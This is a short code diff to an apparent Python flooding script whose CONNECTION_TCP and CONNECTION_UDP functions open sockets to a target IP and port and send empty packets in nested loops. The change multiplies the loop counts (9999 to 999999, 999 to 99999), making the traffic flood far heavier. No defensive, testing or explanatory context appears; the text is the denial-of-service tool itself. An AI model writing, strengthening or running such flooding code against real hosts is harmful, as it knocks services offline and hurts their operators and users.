@@ -9,9 +9,9 @@ def CONNECTION_TCP(ip, port, times):
             s.connect((ip, port))
             s.connect_ex((ip, port))
             s2 = socket.create_connection((ip, port))
-            for _ in range(9999):
+            for _ in range(999999):
                 try:
-                    for _ in range(999):
+                    for _ in range(99999):
                         s.send(b'')
                         s.sendall(b'')
                         s2.send(b'')
@@ -25,9 +25,9 @@ def CONNECTION_UDP(ip, port, times):
     for _ in range(times):
         try:
             s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-            for _ in range(9999):
+            for _ in range(999999):
                 try:
-                    for _ in range(999):
+                    for _ in range(99999):
                         s.sendto(b'', (ip, port))
                         s.sendto(b'', (ip, port))
                 except:
